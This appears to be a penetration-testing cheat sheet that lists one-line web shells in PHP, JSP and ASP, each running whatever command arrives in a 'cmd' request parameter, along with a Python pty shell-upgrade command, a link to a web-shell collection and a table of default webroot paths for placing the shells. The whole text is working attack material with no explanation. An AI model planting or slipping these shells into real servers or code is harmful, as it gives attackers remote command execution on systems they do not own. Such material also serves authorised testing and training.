https://github.com/jbarcia/Web-Shells/tree/master/laudanum
/usr/share/laudanum



```
python3 -c 'import pty; pty.spawn("/bin/bash")'	
```
php
```
<?php system($_REQUEST["cmd"]); ?>
```


JSP
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```


asp
```
<% eval request("cmd") %>
```


	Web Server	Default Webroot
	Apache	/var/www/html/
	Nginx	/usr/local/nginx/html/
	IIS	c:\inetpub\wwwroot\
	XAMPP	C:\xampp\htdocs\

